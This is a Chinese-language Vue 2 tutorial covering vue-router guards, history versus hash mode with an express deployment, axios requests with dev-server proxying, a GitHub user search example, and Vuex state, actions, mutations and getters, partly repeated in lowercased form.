router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\n# 全局后置路由守卫\n\n全局后置路由守卫，是在所有路由的切换之后作出相应的处理。具体在router.index.js里使用router.afterEach(func)，其中这个func就是在每次切换之后会被调用（其实初始化时也会调用一次）。全局后置路由守卫不是用于设置访问权限的，一般用于切换成功修改页面某个内容的。\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\nimport News from \'../pages/News\'\nimport Message from \'../pages/Message\'\nimport Detail from \'../pages/Detail\'\n\nVue.use(Router);\n\nconst router = new Router({\n    routes: [{\n        path: \'/home\',\n        component: Home,\n        // 使用路由元信息meta\n        meta: { title: \'主页\' },\n        children: [{\n            name: \'xinwen\',\n            path: \'news\',\n            component: News,\n            // 使用路由元信息meta\n            meta: { isAuth: true, title: \'新闻\' },\n        }, {\n            name: \'xinxi\',\n            path: \'message\',\n            component: Message,\n            // 使用路由元信息meta\n            meta: { isAuth: true, title: \'信息\' },\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: Detail,\n                // 使用路由元信息meta\n                meta: { title: \'详情\' },\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: About,\n        // 使用路由元信息meta\n        meta: { title: \'关于\' },\n    }]\n})\n// 全局前置路由守卫，每次路由切换之前被调用（初始化时也会被调用一次）\nrouter.beforeEach((to, from, next) => {\n    // 换成to.meta.isAuth来判断\n    if (to.meta && to.meta.isAuth) {\n        // 权限\n        const jurisdiction = localStorage.getItem(\'jurisdiction\');\n        if (jurisdiction && jurisdiction === \'pass\') {\n            next();\n        } else {\n            alert(\'您没有访问的权限！\')\n        }\n    } else {\n        next();\n    }\n});\n// 全局后置路由守卫，每次路由切换之后被调用（初始化时也会被调用一次）\nrouter.afterEach((to) => {\n    // 每次切换成功后修改页签名\n    document.title = to.meta.title || \'Vue\';\n});\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n# 独享路由守卫\n\n独享路由守卫是守卫某个单个路由的切换动作。独享路由守卫没有前置和后置的，它只有beforeEnter: function(to, from, next)，并且就是配置在单个路由信息里，也就是与path和component平级。注意beforeEnter的值就是一个函数，这个函数与全局路由守卫里的func回调函数写法一样，入参也是一样。\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\nimport News from \'../pages/News\'\nimport Message from \'../pages/Message\'\nimport Detail from \'../pages/Detail\'\n\nVue.use(Router);\n\nconst router = new Router({\n    routes: [{\n        path: \'/home\',\n        component: Home,\n        // 使用路由元信息meta\n        meta: { title: \'主页\' },\n        children: [{\n            name: \'xinwen\',\n            path: \'news\',\n            component: News,\n            // 使用路由元信息meta\n            meta: { title: \'新闻\' },\n            // 独享路由守卫\n            beforeEnter: (to, from, next) => {\n                const jurisdiction = localStorage.getItem(\'jurisdiction\');\n                if (jurisdiction && jurisdiction === \'pass\') {\n                    next();\n                } else {\n                    alert(\'您没有访问的权限！\')\n                }\n            },\n        }, {\n            name: \'xinxi\',\n            path: \'message\',\n            component: Message,\n            // 使用路由元信息meta\n            meta: { title: \'信息\' },\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: Detail,\n                // 使用路由元信息meta\n                meta: { title: \'详情\' },\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }],\n            // 独享路由守卫\n            beforeEnter: (to, from, next) => {\n                const jurisdiction = localStorage.getItem(\'jurisdiction\');\n                if (jurisdiction && jurisdiction === \'pass\') {\n                    next();\n                } else {\n                    alert(\'您没有访问的权限！\')\n                }\n            },\n        }]\n    }, {\n        path: \'/about\',\n        component: About,\n        // 使用路由元信息meta\n        meta: { title: \'关于\' },\n    }]\n})\n// 全局后置路由守卫，每次路由切换之后被调用（初始化时也会被调用一次）\nrouter.afterEach((to) => {\n    // 每次切换成功后修改页签名\n    document.title = to.meta.title;\n});\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n# 组件内路由守卫\n\n前面的全局路由和独享路由都是基于路由本身来说的。我们说一下与路由对应的组件相关的守卫，我们常称为组件内路由守卫，它们在组件内部来使用的，非常像生命周期钩子。\n\n通过路由规则进入该组件时会调用beforeRouteEnter(to, from, next)，通过路由规则离开组件时会调用beforeRouteLeave(to, from, next)。一定要注意，是通过路由的方式，也就是<router-link>或者$router.push()让组件展示的，并不是使用组件标签调用的。\n\n<template>\n  <div>\n    <ul>\n      <li>news001<input /></li>\n      <li>news002<input /></li>\n      <li>news003<input /></li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "News",\n  // 通过路由规则进入组件时被调用\n  beforeRouteEnter(to, from, next) {\n    if (to.meta && to.meta.isAuth) {\n      const jurisdiction = localStorage.getItem("jurisdiction");\n      if (jurisdiction && jurisdiction === "pass") {\n        next();\n      } else {\n        alert("您没有访问的权限！");\n      }\n    } else {\n      next();\n    }\n  },\n  // 通过路由规则离开组件时被调用，要与router.afterEach区分开\n  // router.afterEach且成功切换到路由，beforeRouteLeave是离开组件，不一定成功去往了to的组件\n  beforeRouteLeave(to, from, next) {\n    console.log("to", to);\n    console.log("from", from);\n    next();\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 3.10 history模式和hash模式\n\nVue Router默认是hash模式的，路径里会出现/#，它的好处是/#后面的路径在重新加载页面时不会传递给服务器，这样就不会导致请求不到资源而报错。而history模式却是将端口号以后的完整路径传给服务器进行请求，如果请求不到资源就会报错，因为传递过来的其实是前端自己的路由地址，在服务端并没有该地址的接口处理或者没有该地址对应的资源就会报错。\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nVue.use(Router);\n\nconst router = new Router({\n    mode: \'history\', // 默认是hash模式，可以改为history模式\n    routes: [...],\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n项目上线一般选择history模式，至于服务端怎么处理就得借助中间件了。我们简单使用express做一下项目上线演示。\n\n * 新建一个服务端项目vue_express_test，然后在该项目里使用npm init初始化项目，然后使用npm i express安装express，再使用npm i connect-history-api-fallback。\n * 在vue_express_test项目的根目录下新建一个static目录和server.js文件，前者用于存放Vue项目经过build后的静态文件，后者是用于启动项目。\n * 在前端的Vue项目中运行npm run build，会生成一个dist文件夹，将里面的东西全部复制到服务端项目的static里。\n * 准备一下server.js的内容后，在服务器端使用node server.js运行，然后在浏览器里输入localhost:5005就可以查看部署的前端页面了。\n\nserver.js：\n\nconst express = require(\'express\');\nconst history = require(\'connect-history-api-fallback\');\nconst app = express();\n// 解决前端history模式下请求服务器报错的问题\napp.use(history());\n// 指定静态资源\napp.use(express.static(__dirname + \'/static\'));\napp.get(\'preson\', (req, resp) => {\n    resp.send({\n        name: \'张三\',\n        age: 18\n    })\n});\napp.listen(5005, (err) => {\n    if (!err) console.log(\'服务器启动了\');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 对于一个url来说，什么是hash值？——#及其后面的内容就是hash值。\n 2. hash值不会包含在HTTP请求中，即：hash值不会带给服务器。\n 3. hash模式：\n    1. 地址永远带着#号，不美观。\n    2. 若以后将地址通过第三方手机App分享，若App校验严格，则地址会被标记为不合法。\n    3. 兼容性好。\n 4. history模式：\n    1. 地址干净、美观。\n    2. 兼容性相比于hash模式略差。\n    3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。\n\n----------------------------------------',normalizedContent:'# vue周边\n\n\n# 一、vue中的ajax\n\n\n# 1.1 使用axios并解决跨域\n\n前端ajax技术大多是基于xmlhttprequest的（这一节的ajax以及跨域可以看之前的文章），我们这一节要使用的axios就是对xmlhttprequest进行了封装。使用npm i axios来局部安装它，然后使用import axios from "axios"引入到组件中，最后使用它来发送http请求，来请求已经部署在本地5000端口的后端项目。\n\n<template>\n  <div class="student">\n    <h3>姓名：{{ name }}</h3>\n    <h3>年龄：{{ age }}</h3>\n    <button @click.stop="getstudentinfo">获取学生信息</button>\n  </div>\n</template>\n\n<script>\nimport axios from "axios";\nexport default {\n  name: "student",\n  data() {\n    return {\n      name: "张三",\n      age: 18,\n    };\n  },\n  methods: {\n    getstudentinfo() {\n      // 使用axios进行http请求\n      axios.get("http://localhost:5000/students").then(\n        (response) => {\n          console.log("响应数据", response.data);\n        },\n        (error) => {\n          console.log("请求失败", error.message);\n        }\n      );\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n在页面点击发现浏览器控制台报has been blocked by cors policy这样的错误，这是因为本vue前端项目部署在http://localhost:8080/，而请求的后端接口是http://localhost:5000/students，同域名同协议但不同端口号了，这是跨域问题。\n\n我们知道axios的底层xmlhttprequest是支持cors这个跨域解决方案的，并且在使用axios时是自动为我们设置了请求头里的origin字段，但是我们现在部署在本地的后端项目没有处理响应头的access-control-allow-origin字段，也就是说前端支持cors但后端项目还暂不支持cors。可以看下面我截取的部分request请求头和response响应头。\n\n// 请求头部信息，有origin\naccept: application/json, text/plain, */*\naccept-encoding: gzip, deflate, br\naccept-language: zh-cn,zh;q=0.9\nconnection: keep-alive\nhost: localhost:5000\norigin: http://localhost:8080\nreferer: http://localhost:8080/\n\n// 响应头部信息，没有access-control-allow-origin\nconnection: keep-alive\ncontent-length: 110\ncontent-type: application/json; charset=utf-8\ndate: fri, 17 sep 2021 19:29:25 gmt\netag: w/"6e-whidwjxg0dvzhrizaitiyljbafc"\nx-powered-by: express\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n解决这个问题的方法：要么修改后端代码去设置响应头部的access-control-allow-origin，要么给前端配一个代理服务器进行请求的转发。这里我们就选择使用vue cli给我们提供的代理服务器。打开前端项目根目录下的vue.config.js，在里面写上如下配置，保存好后重启项目。\n\nmodule.exports = {\n    // 开启代理服务器，proxy的值就是服务器地址，也就是请求转发地址\n    devserver: {\n        proxy: \'http://localhost:5000\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n配置好代理服务器后，项目中使用axios的地方，请求的地址的端口必须换成8080，也就是将http://localhost:5000/students改为http://localhost:8080/students，这是因为现在代理服务器处于和本前端项目部署端口一致都是8080。最后，在页面点击按钮，就能正常获取到接口返回的数据了。\n\n上面这种配置代理的方式会有两个限制，一是不能配置多个代理；二是，因为代理服务器与本项目部署使用端口号一样，那请求资源时其实会先从本项目的public下寻找资源，找不到才会去被代理地址寻找资源。其实vue cli还有另外一种代理服务器的配置。\n\nmodule.exports = {\n    // 开启代理服务器\n    devserver: {\n        proxy: {\n            \'api\': {\n                target: \'http://localhost:5000\',\n                pathrewrite: { \'^/api\': \'\' },\n            },\n            \'/myapi\': {\n                target: \'http://localhost:5000\', // 请求转发地址\n                pathrewrite: { \'^/myapi\': \'\' }, // 匹配\'/myapi\'开头的请求地址，将\'/myapi\'替换为\'\'\n                // ws: true, // 是否支持websocket\n                // changeorigin // 是否让请求头的host与服务器地址保持一致\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n这种代理服务器配置方式可以配置多个代理服务器，然后因为它可以是有接口名前缀，是用于区分前端public里的资源还是后端资源，但在前端项目进行请求时中记得加上这些前缀，比如http://localhost:8080/myapi/students。\n\n\n# 1.2 用户搜索案例\n\n我们使用axios去请求一个github提供的公共接口，它返回一个用户列表信息。我们需要制作两个组件，一个搜索区域，一个展示列表区域（为了演示没有将item拆出来）。然后还要给它制作一个简单提示，例如“欢迎来到xxx”、“正在加载中”、“请求错误”等。\n\n父组件app.vue：\n\n<template>\n  <div><hubsearch /><hubuserlist /></div>\n</template>\n\n<script>\nimport hubsearch from "./components/hubsearch.vue";\nimport hubuserlist from "./components/hubuserlist.vue";\nexport default {\n  name: "app",\n  components: { hubuserlist, hubsearch },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n搜索区域hubsearch.vue：\n\n<template>\n  <div class="search-outer">\n    <h3 class="search-input">search github users</h3>\n    <div>\n      <input\n        type="text"\n        placeholder="enter the name you search"\n        v-model="keyword"\n      />&nbsp;<button @click="getuserlist">search</button>\n    </div>\n  </div>\n</template>\n\n<script>\nimport axios from "axios";\nexport default {\n  name: "hubsearch",\n  // keyword是输入框里的内容，isfirst是否第一次使用\n  data() {\n    return {\n      keyword: "",\n      isfirst: true,\n    };\n  },\n  methods: {\n    getuserlist() {\n      // 输入框没有内容就返回\n      if (!this.keyword) return;\n      // 只第一次才去触发changenofirst事件，后面无需再管理isfirst\n      if (this.isfirst) {\n        this.isfirst = false;\n        // 通知hubuserlist组件，开始搜索了，把欢迎页面撤掉\n        this.$bus.$emit("changenofirst", this.isfirst);\n      }\n      // 通知hubuserlist组件，用户点了搜索，页面换成“正在加载”\n      this.$bus.$emit("requestloading", true);\n      // 使用axios进行接口请求\n      axios.get(`https://api.github.com/search/users?q=${this.keyword}`).then(\n        (response) => {\n          console.log("请求成功：", response);\n          if (response.data != null) {\n            // 通知hubuserlist组件，将用户信息传给它，并且把“正在加载”撤掉换成用户列表页面\n            this.$bus.$emit("getuserinfo", response.data);\n          }\n        },\n        (error) => {\n          console.log("请求失败：", error);\n          if (error && error.message) {\n            // 通知hubuserlist组件，将错误信息传给它，并且把“正在加载”撤掉换成错误展示页面\n            this.$bus.$emit("requestfailed", error.message);\n          }\n        }\n      );\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n用户列表展示区域hubuserlist.vue：\n\n<template>\n  <div class="row">\n    <h1 v-if="isfirst">欢迎使用！</h1>\n    <div v-if="!isfirst">\n      <h1 v-show="errormsg">搜索失败，错误信息是：{{ errormsg }}</h1>\n      <h1 v-show="isloading">正在加载...</h1>\n      <div\n        class="card"\n        v-show="!isloading"\n        v-for="useritem in userlist"\n        :key="useritem.login"\n      >\n        <a :href="useritem.html_url" target="_blank">\n          <img :src="useritem.avatar_url" style="width: 100px" />\n        </a>\n        <p class="card-text">{{ useritem.login }}</p>\n      </div>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "hubuserlist",\n  data() {\n    return {\n      isfirst: true,\n      isloading: false,\n      errormsg: "",\n      userlist: [],\n    };\n  },\n  mounted() {\n    // 接收hubsearch组件的通知，用户开始搜索，撤掉欢迎页面\n    this.$bus.$on("changenofirst", (bool) => {\n      this.isfirst = bool;\n    });\n    // 接收hubsearch组件的通知，用户列表信息拿到了，撤掉“正在加载”页面，换上信息列表页面\n    this.$bus.$on("getuserinfo", (userinfo) => {\n      if (userinfo) {\n        // 正在加载状态更改为加载完毕\n        this.isloading = false;\n        // 校验，然后再保存信息\n        if (userinfo.items && userinfo.items.length)\n          this.userlist = userinfo.items;\n      }\n    });\n    // 接收hubsearch组件的通知，用户开始搜索，换上“正在加载”页面\n    this.$bus.$on("requestloading", (bool) => {\n      this.isloading = bool;\n      // 上一的请求可能发生过，这次开始请求就将错误信息清空\n      if (this.errormsg) this.errormsg = "";\n    });\n    // 接收hubsearch组件的通知，请求出错，撤掉“正在加载”换上错误展示信息页面\n    this.$bus.$on("requestfailed", (errormsg) => {\n      if (errormsg) {\n        this.errormsg = errormsg;\n        // 请求完成了，虽然发生了错误，加正在加载状态改为加载完毕\n        this.isloading = false;\n      }\n    });\n  },\n};\n<\/script>\n\n<style scoped>\n.card {\n  float: left;\n  width: 33.333%;\n  padding: 0.75rem;\n  margin-bottom: 2rem;\n  border: 1px solid #efefef;\n  text-align: center;\n}\n\n.card > img {\n  margin-bottom: 0.75rem;\n  border-radius: 100px;\n}\n\n.card-text {\n  font-size: 85%;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n\n\n\n# 1.3 vue resource\n\nvue resource也是对xhr进行了封装，但它在vue1.0版本用得比较多，在工作中可能还会遇到这种技术，所以简单了解一下。使用npm i vue-resource进行局部安装，然后在main.js中引入它，再使用插件的形式将他增加到vue原型上：\n\nimport vue from \'vue\'\nimport app from \'./app.vue\'\nimport vueresource from \'vue-resource\'\n\nvue.use(vueresource);\n\nnew vue({\n  el: \'#app\',\n  render: h => h(app),\n  components: {\n    app\n  },\n  beforecreate() {\n    vue.prototype.$bus = this;\n  }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n后续的使用同axios\n\n\n# 二、vuex\n\n\n# 2.1 vuex介绍\n\nvuex是一个插件，在项目中用vue.use(xxx)添加到vue上。vuex的作用是，集中管理多个组件的共享状态（共用数据），它适用于任意组件间的通信。\n\n那么vuex与自定义事件的使用场景区别：\n\n * 只涉及个别组件，比如只有一对父子组件之间要进行简单的通信，就可以使用自定义事件。\n * 涉及的组件稍多点，比如一个父组件多个子组件，那就可以使用全局事件总线。\n * 涉及的组件多并且层级复杂，那么使用vuex会比较合适。\n\n上面第三点关于全局事件总线不适用的详细说明：\n一旦通信的组件多而且组件间的层级很复杂时，共享数据的读取会非常的不方便。共享数据的读取，第一种方式是使用props传参，第二种方式用得少，组件各自存相同的数据，谁的数据变化了谁就使用$emit通知对方也同时更新。这两种方式在刚刚那个条件下都有缺点：第一种方式的缺点是会产生多层的porps传递，比如爷组件传给孙组件，就要经过父组件，可能父组件都没有实质性地用到该数据；第二种方式的缺点就是数据各自维护，表面是数据共享，实质只是数据相同，所以全局事件总线基本上都是用props进行共享数据的读取。\n\n而vuex应对这种场景就非常擅长了，它会将组件共享数据提取出来放在一起进行集中式管理，也会将修改数据的方法提取出来放在一起集中式管理，所以你不管是读还是改都会非常的方便。所谓集中式管理，就是把以前的“事件回调函数”从它们原本的组件中抽离出来，也就是不写在组件内部了，同样的，共享数据的定义也不在组件内部定义了，也全部抽离出来。放在哪？下面的vuex工作原理图会接着说。\n\nvuex工作原理图：\n\n\n\n * store：图中的虚线框是vuex，它其实有个隐藏着的store，vuex在我们项目中具现化的就是这个store，它实际管理着state、mutation和action。\n * state：它是vuex中的唯一数据源，存储并集中管理着多个组件的共享数据（状态）。\n * mutation：它存放并集中管理着修改state数据的方法。这里的“方法”，与全局事件总线中的回调函数非常类似，都用于修改共享数据。\n * action：它存放并集中管理着含有异步操作的方法，mutation里存的只能是同步的方法。所以action里的方法可以用来请求接口、设置定时器等。\n\n在提取业务代码时，可以将独特的逻辑留在组件了，把大部分公共业务逻辑代码放到action里，mutation只放最最公共的业务逻辑或者简单的数据修改。\n\n\n# 2.2 搭建vuex环境\n\n先使用npm i vuex在项目中局部安装vuex，然后在项目根目录下新建store目录，并在该目录下新建index.js文件。用于存放store相关代码，也是用于集中管理state里的数据、mutation里的方法以及action里的方法。\n\nimport vue from \'vue\';\nimport vuex from \'vuex\';\n/*\n  必须在vuex.store实例化之前将vuex功能添加到vue里，否则会报\n  `[vuex] must call vue.use(vuex) before creating a store instance.`\n  原因是vuex.store的内部用到了经过vue.use(vuex)增强后的vue。\n*/\nvue.use(vuex)\n\n// 虽然vuex功能添加进来了，但它还需要具象化，也就是需要对vuex.store进行实例化\n// 实例化同时，为state、mutations、actions开辟空间，便于集中管理\nexport default new vuex.store({\n  state: { // 开辟空间，集中管理共享数据\n\n  },\n  actions: { // 开辟空间，集中管理异步方法\n\n  },\n  mutations: {// 开辟空间，集中管理同步方法\n\n  }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n将导出的store实例放在vue配置对象的名为store属性上，是为了让每个组件都能使用store。main.js代码如下：\n\nimport vue from \'vue\'\nimport app3 from \'./app3.vue\'\nimport store from \'./store/index\'\n\nnew vue({\n  el: \'#app\',\n  render: h => h(app3),\n  // 在这里放入store实例，那么每个组件里都能使用`this.$store`访问了\n  store,\n  components: { app3 },\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 2.3 vuex的基本使用\n\n我们先准备一个基础版的count组件，有各种求和功能，代码如下。\n\n<template>\n  <div>\n    <h2>当前和为：{{ sum }}</h2>\n    <select v-model.number="num">\n      <option value="1">1</option>\n      <option value="2">2</option>\n      <option value="3">3</option>\n    </select>\n    <button @click="increment">加{{ num }}</button>\n    <button @click="decrement">减{{ num }}</button>\n    <button @click="incrementodd">当前和为奇数时再加{{ num }}</button>\n    <button @click="incrementwait">等一等再加{{ num }}</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "count",\n  data() {\n    return {\n      num: 1,\n      sum: 0,\n    };\n  },\n  methods: {\n    increment() {\n      this.sum += this.num;\n    },\n    decrement() {\n      this.sum -= this.num;\n    },\n    incrementodd() {\n      if (this.sum % 2 === 0) return;\n      this.sum += this.num;\n    },\n    incrementwait() {\n      settimeout(() => {\n        this.sum += this.num;\n      }, 1000);\n    },\n  },\n};\n<\/script>\n\n<style>\nbutton {\n  margin-left: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\n我们需要将sum提取到state里，然后将各种求和的方法提取到actions和mutations里。尽量把公共的复杂的业务逻辑和异步操作放到actions里，把最最公共的业务逻辑和最简单的state数据变更放到mutations里。\n\nindex.js：\n\nimport vue from \'vue\';\nimport vuex from \'vuex\';\nimport { addwait, addodd } from \'./actions-types\';\nimport { count_add, count_subtract } from "./mutation-types";\n\nvue.use(vuex)\n\nexport default new vuex.store({\n    state: { sum: 0 },\n    actions: {\n        // 异步方法，context具有store大部分属性和方法，value是提供的相关新数据\n        [addwait](context, value) {\n            settimeout(() => {\n                context.commit(count_add, value);\n            }, 1000)\n        },\n        // 公共的复杂的业务逻辑放到actions里。简单数据变更就放到mutations里\n        [addodd]({ state, commit }, value) {\n            if (state.sum % 2) commit(count_add, value);\n        }\n    },\n    mutations: {\n        // state就是共享数据，value是提供的相关新数据\n        [count_add](state, value) {\n            state.sum += value; // 只是简单的数据变更，如果有复杂的逻辑就抽到actions里\n        },\n        // state就是共享数据，value是提供的相关新数据\n        [count_subtract](state, value) {\n            state.sum -= value;\n        },\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n使用store过后的count.vue：\n\n<template>\n  <div>\n    \x3c!-- 使用共享数据sum --\x3e\n    <h2>当前和为：{{ $store.state.sum }}</h2>\n    <select v-model.number="num">\n      <option value="1">1</option>\n      <option value="2">2</option>\n      <option value="3">3</option>\n    </select>\n    <button @click="increment">加{{ num }}</button>\n    <button @click="decrement">减{{ num }}</button>\n    <button @click="incrementodd">当前和为奇数时再加{{ num }}</button>\n    <button @click="incrementwait">等一等再加{{ num }}</button>\n  </div>\n</template>\n\n<script>\nimport { addwait, addodd } from "../store/actions-types";\nimport { count_add, count_subtract } from "../store/mutation-types";\nexport default {\n  name: "count",\n  data() {\n    // 把sum提取到state\n    return { num: 1 };\n  },\n  methods: {\n    increment() {\n      // 让mutations里的count_add进行执行，并提供一个参数\n      this.$store.commit(count_add, this.num);\n    },\n    decrement() {\n      // 让mutations里count_subtract进行执行，并提供一个参数\n      this.$store.commit(count_subtract, this.num);\n    },\n    incrementodd() {\n      // 让actions里addodd进行执行，并提供一个参数\n      this.$store.dispatch(addodd, this.num);\n    },\n    incrementwait() {\n      // 让actions里addwait进行执行，并提供一个参数\n      this.$store.dispatch(addwait, this.num);\n    },\n  },\n};\n<\/script>\n\n<style>\nbutton {\n  margin-left: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\nactions里的方法的第一个形参context，有这些属性：commit、dispatch、getters、rootgetters、rootstate、state。它如此设计目的是，能在actions的方法里面进行非常复杂的操作，例如组合使用actions里的方法，再例如连续使用promise，再例如根据state数据的值来确定是进行异步还是继续commit等。\n\nmutations里的方法的第一个形参state，最好只做一些简单判断和修改值，它给你只提供了state，所以也没法进行非常复杂的业务判断（当然也别想着进行异步操作）。使用vue devtools可以查看mutations和state，却看不了actions。\n\n\n# 2.4 getters\n\n多个组件在使用state数据时，可能需要进行一些处理，比如过滤操作，那么在组件各自的computed去做计算属性，让计算属性去依赖state数据。大部分确实是这么做的也应该这么做，如果多个组件的处理逻辑一样呢？那代码是不是重复了？\n\n其实可以使用vuex的getters（与state平级），它将多个组件里共用的计算属性提取到getters的属性上，这些属性实际上是依赖于某个state数据。只要state数据变化了，对应依赖它的getters就会随之变化。\n\n你可以看到那store里的getters，和组件里的计算属性非常的像，它们的区别是，store里的getters只有getter而没有setter，而组件的计算属性即拥有getter也拥有setter。\n\n// 某个组件的计算属性，依赖于一个state数据，做一个过滤的操作\ncomputed: {\n  donetodoscount () {\n    return this.$store.state.todos.filter(todo => todo.done).length\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n如果多个组件都使用过滤的逻辑，就可以提取到store的getters里形成复用：\n\n// 在store里添加getters配置项，用于存储公共的“计算属性”\nconst store = new vuex.store({\n  state: {\n    todos: [\n      { id: 1, text: \'...\', done: true },\n      { id: 2, text: \'...\', done: false }\n    ]\n  },\n  getters: {\n    // 相当于store的计算属性的getter方法，并且它还是公共的，能被很多组件访问\n    donetodos: state => {\n      return state.todos.filter(todo => todo.done)\n    }\n  }\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n虽然getters的属性是只有getter没有setter，但是他有一个非常重要的扩展功能，那就是可以接收参数，按照参数来进行逻辑处理。比如按照参数来过滤列表。虽然getters是多处复用的，代码都一样，但我还是想传点参数可以进行业务判断。\n\n// store里的getters，如果接收另外的参数，相当于返回一个函数\ngetters: {\n  // gettodobyid在被子组件使用时，可接收一个参数，用于对公共数据todos进行特定值的寻找\n  gettodobyid: (state) => (id) => {\n    return state.todos.find(todo => todo.id === id)\n  }\n}\n\n// 子组件使用处，既然你返回的是一个函数，那我就可以对它进行传参，进行特定的处理逻辑\nstore.getters.gettodobyid(2) // -> { id: 2, text: \'...\', done: false }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 2.5 辅助函数——快速生成属性和方法\n\n前面一节里，我们通常将state数据使用组件的计算属性来接收，这样反常方便的在模板中使用（减少了$store.state.这两层访问）。\n\n一旦组件里使用的state数据过多，那每次都要在computed手动生成对应的计算属性，非常的不方便。我们可以使用mapstate辅助函数，帮助我们快速的自动的生成对应的计算数据。当然，既然state数据可以使用mapstate进行快速生成，getters也可以使用对应的mapgetters进行快速生成。\n\nmapstate和mapgetters的入参可以是对象也可以是数组。如果是对象，那表示state数据名和本组件计算属性名不一样；如果是数组，那表示state数据名和本组件计算属性名一致。\n\nmapstate和mapgetters的返回值是一个对象，该对象里的所有属性名就是刚刚说的传参数据，我们需要将这个返回对象打散并放入本组件的computed里，具体是使用...展开符。\n\n我们先准备一个store(store/index.js)：\n\nimport vue from \'vue\';\nimport vuex from \'vuex\';\nimport { count_add } from 